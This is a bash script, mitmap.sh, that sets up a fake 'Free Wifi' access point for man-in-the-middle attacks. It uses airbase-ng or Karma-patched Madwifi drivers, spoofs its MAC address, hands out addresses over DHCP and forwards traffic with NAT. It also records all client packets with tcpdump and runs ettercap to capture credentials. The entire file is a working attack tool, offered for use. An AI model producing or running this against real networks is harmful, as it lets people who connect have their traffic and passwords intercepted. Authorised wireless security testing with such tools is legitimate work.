#!/bin/bash
#=================================================
#
# FILE: mitmap.sh
#
# USAGE: ./mitmap.sh <options>
#
# DESCRIPTION: Script to lunch fake ap for Man In The Middle Attacks
#
# OPTIONS: Wireless car supported by Aircrack-ng for injection.
#	   File with MAC addresses for filtering connection 
#	   Madwifi Drives Patched with the DigiNinja Karma Patch
# BUGS: Only has been tested with Atheros, Realteck L8187 and Ralink 2750 cards.
# NOTES: Latest version of SVN of Aircrack-ng as whell as latest drivers must me used.
# AUTHOR: carlos_perez(at)darkoperator.com
# VERSION: 0.1.2
# CREATED: 12/27/08 
# REVISION:
#=================================================
#Initialize Wireless interface variable
IW=
#Initialize interface to be routed to variable
IE=
#Initialize mode variable
MODE=
#Initilize SSID variable
SSID="Free Wifi"
#Initialize Macfilter file Variable
FILTER="/noexist"
#Variable with number of arguments passed to the script
NUM=$#
#Variable with time of launch used for log names
NOW=$(date +"-%b-%d-%y-%H%M%S")
#Variable for log folder
LOGFOLDER="/root/"
A1="ath0"
A2="wlan0"
#Variable for dhcpd configuration file
DHCPDCONF="/tmp/dhcpd.conf"
#Capture crtl-c and it will kill aproceed to clean up any process left 
trap cleanup INT
#Usage funtion for printing the help message
function usage ()
{
	echo "Scritp for launching Fake AP to perform Man in The Middle Attack"
	echo "By Carlos_Perez[at]darkoperator.com"
	echo "Ver 0.1.2"
	echo "Usage:"
	echo "./mitmap.sh -m <mode> -i <wireless interface> -o <internet interface> <options>"
	echo ""
	echo "Modes:"
	echo ""
	echo "ap		:Access Point using Airbase-ng"
	echo "apf		:Access Point using Airbase-ng and MAC Filtering"
	echo "apa		:Access Point using Digininja patched Madwifi kernel modules"
	echo "apaf		:Access Point using Digininja patched Madwifi Kernel modules and MAC filtering"
	echo ""
	echo "Options:"
	echo ""
	echo "-s <ssid> 	:SSID to use for the Fake AP"
	echo "-f <text file>	:text file containing MAC addresses to use as filter one per line"
	echo "-d <dhcpd conf>	:Dhcpd configuration file"
	echo "-h 		: This help message"
}
#Airbase-ng Karma style interface initialization
function abngkinit ()
{
	if [ $IW == $A1 ]; then
		ifconfig $IW down >> $LOGFILE 2>&1 &
		wlanconfig ath0 destroy >> $LOGFILE 2>&1 &
		echo -e "\033[1;32mChanging MAC Address\033[1;37m"
		macchanger -A wifi0
		airmon-ng start wifi0 >> $LOGFILE 2>&1 &
		sleep 2
	elif [ $IW == $A2 ];then
		ifconfig $IW down >> $LOGFILE 2>&1 &
                echo -e "\033[1;32mChanging MAC Address\033[1;37m"
                macchanger -A wlan0
                airmon-ng start wlan0 >> $LOGFILE 2>&1 &
		IW=mon0
                sleep 2
	else
		ifconfig $IW down >> $LOGFILE 2>&1 &
		macchanger -A $IW
		ifconfig $IW up >> $LOGFILE 2>&1 &
		echo -e "\033[1;32mChanging MAC Address\033[1;37m"
		#macchanger -A $IW
		airmon-ng start $IW >> $LOGFILE 2>&1 &
		sleep 2
	fi
	modprobe tun	
	echo -e "\033[1;32mstarting fake ap\033[1;37m"
	airbase-ng -P -C 60 -e "$SSID" $IW >> $LOGFILE 2>&1 &
	if [ $? -eq 1 ] ; then
	       echo -e "\033[1;31mFailed to start AP. Make sure you have the latest version of Aircrack-ng\033[1;37m"
	       echo -e "\033[1;31mand that your wireless cards support injection.\033[1;37m"
	       cleanup
       fi   
	#give enough time before next command for interface to come up
	#specialy on Virtual Machines with USB cards
	echo "This will take 15 seconds .............."
	#$IW = "at0"
	sleep 10
	#changing MTU size for Interface
	echo -e "\033[1;32mChanging MTU Size for At0 to 1400\033[1;37m"
	ifconfig at0 mtu 1400
	IW="at0"
	ifconfig at0 10.0.0.1 netmask 255.255.255.0

}
#Airbase-ng Karma style interface initialization with MAC Address Filtering
function abngkinitfiltered ()
{
	if [ $IW == $A1 ]; then
		ifconfig $IW down >> $LOGFILE 2>&1 &
		wlanconfig ath0 destroy >> $LOGFILE 2>&1 &
		echo -e "\033[1;32mChanging MAC Address\033[1;37m"
		macchanger -A wifi0
		airmon-ng start wifi0 >> $LOGFILE 2>&1 &
		sleep 2
	else
		ifconfig $IW up >> $LOGFILE 2>&1 &
		echo -e "\033[1;32mChanging MAC Address\033[1;37m"
		macchanger -A $IW
		airmon-ng start $IW >> $LOGFILE 2>&1 &
		sleep 2
	fi
	modprobe tun	
	echo -e "\033[1;32mstarting fake ap with filtering\033[1;37m"
	airbase-ng -P -C 60 -e "$SSID" --clients $FILTER $IW >> $LOGFILE 2>&1 &
	if [ $? -e 1 ] ; then
	       echo -e "\033[1;31mFailed to start AP. Make sure you have the latest version of Aircrack-ng\033[1;37m"
	       echo -e "\033[1;31mand that your wireless cards support injection.\033[1;37m"
	       cleanup
       fi
	#give enough time before next command for interface to come up
	#specialy on Virtual Machines with USB cards
	echo "This will take 15 seconds .............."
	#$IW = "at0"
	sleep 15
	#changing MTU size for Interface
	echo -e "\033[1;32mChanging MTU Size for At0 to 1400\033[1;37m"
	ifconfig at0 mtu 1400
	IW="at0"
	ifconfig at0 10.0.0.1 netmask 255.255.255.0

}
#DigiNinja Atheros Karma interface initialization
function mdwfkinit ()
{
	#Based on HD original karmetasploit scripts 
	find /proc/net -name 'ath?' | sed -e 's/.*ath/ath/g' | xargs -i wlanconfig {} destroy
	echo Master Mode: `wlanconfig ath0 create wlandev wifi0 wlanmode ap`
	macchanger -A ath0

	# Enable KARMA mode
	iwpriv ath0 karma 1
	if [ $? -ne 0 ] ; then
		echo -e "\033[1;31mThe Madwifi Drivers appear to not have the karma patch applied\033[1;37m"
		cleanup
	else
		echo -e "\033[1;32mStarting Atheros Card in Karma Mode Succesful\033[1;37m"
	fi

	# Configure the interface
	iwconfig ath0 essid "$SSID"
	iwconfig ath0 mode master
	iwconfig ath0 channel 6
	ifconfig ath0 up 10.0.0.1 netmask 255.255.255.0

}
#DigiNinja Atheros Karma MAC Address Filtering
function mdwfkinitfiltered ()
{
	if [ -e $FILTER ]; then
		echo -e "\033[1;32mStarting fake ap with MAC Filtering\033[1;37m"
		for M in `cat $FILTER`; do
			iwpriv ath0 addmac $M
		done 
		iwpriv ath0 maccmd 1
	else
		echo -e "\033[1;31mFilter File does not exist\033[1;37m"
		echo $FILTER
		#cleanup
	fi
}
#Router with NAT Initialization
function routerinit ()
{
	#Clear any dhcp leases that might have been left behind
	echo > /var/lib/dhcp3/dhcpd.leases
	#start dhcpd daemon with special configuration file
	if [ -e $DHCPDCONF ] ; then
                echo "File Exists"
        else
                echo -e "\033[1;31mConfiguration file for dhcpd does not exist or not provided generating dhcpd.conf\033[1;37m"
                #echo "option domain-name-server 10.0.0.1;" > /tmp/dhcpd.conf
                echo "default-lease-time 60;">> /tmp/dhcpd.conf
                echo "max-lease-time 72;" >> /tmp/dhcpd.conf
                echo "ddns-update-style none;" >> /tmp/dhcpd.conf
                echo "authoritative;" >> /tmp/dhcpd.conf
                echo "log-facility local7;" >> /tmp/dhcpd.conf
                echo "subnet 10.0.0.0 netmask 255.255.255.0 {" >> /tmp/dhcpd.conf
                echo "range 10.0.0.100 10.0.0.254;" >> /tmp/dhcpd.conf
                echo "option routers 10.0.0.1;" >> /tmp/dhcpd.conf
		for d in $(cat /etc/resolv.conf | sed -r 's/^.* ([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}).*$/\1/' | grep -E '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}')
		do
			echo "option domain-name-servers $d;" >> /tmp/dhcpd.conf
		done
              	echo "}"  >> /tmp/dhcpd.conf
                DHCPDCONF="/tmp/dhcpd.conf"
        fi

	dhcpd3 -cf $DHCPDCONF $IW >> $LOGFILE 2>&1 &
	if [ $? -ne 0 ] ; then
		echo -e "\033[1;31mThe DHCPD server could not be started exiting\033[1;37m"
		cleanup
	else
		echo -e "\033[1;32mDHCPD started succesfully\033[1;37m"
	fi
	sleep 2
	#capture all packets
	echo -e "\033[1;32mStarting Packet capture to ${LOGFOLDER}apmitm${NOW}.cap\033[1;37m"
	tcpdump -ni $IW -s 0 -w "${LOGFOLDER}mitmap${NOW}.cap" >/dev/null 2>&1 &
	route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
	iptables --flush
	iptables --table nat --flush
	iptables --delete-chain
	iptables --table nat --delete-chain
	iptables -P FORWARD ACCEPT
	iptables -t nat -A POSTROUTING -o $IE -j MASQUERADE
	echo "1" > /proc/sys/net/ipv4/ip_forward
	ettercap -T -q -p -u -i $IW && cleanup
}
#Cleanup of all running processes
function cleanup ()
{
	iptables --flush
	iptables --table nat --flush
	iptables --delete-chain
	echo "0" > /proc/sys/net/ipv4/ip_forward
	killall -9 dhcpd3 tcpdump airbase-ng >> $LOGFILE 2>&1 &
	echo > /var/lib/dhcp3/dhcpd.leases
	airmon-ng stop $IW >> $LOGFILE
	if [ $MODE == "apa" ] || [ $MODE == "apaf" ]; then
		iwpriv ath0 maccmd 1 >> $LOGFILE 2>&1 &
	fi 
	rm /tmp/dhcpd.conf
	exit 1

}
#--------------------MAIN-----------------------
while getopts ":m:i:f:s:l:o:d:h:" options; do
  case $options in
    m ) MODE=$OPTARG;;
    i ) IW=$OPTARG;;
    f ) FILTER=$OPTARG;;
    s ) SSID=$OPTARG;;
    o ) IE=$OPTARG;;
    d ) DHCPDCONF=$OPTARG;;
    l ) LOGFOLDER=$OPTARG;;
    h ) usage;;
    \? ) usage
         exit 1;;
    * ) usage
          exit 1;;

  esac
done
#Variable with log file location for trobleshooting
LOGFILE="${LOGFOLDER}mitmap$NOW.log"
if [[ -n "$MODE" && -n "$IW" && -n $IE ]]; then

	case $MODE in
	ap) abngkinit 
     		routerinit;;
	apf) abngkinitfiltered
      		 routerinit;;
	apa) mdwfkinit
		routerinit;;	
	apaf) mdwfkinit
		mdwfkinitfiltered
		routerinit;;	
	esac
else
	usage
fi

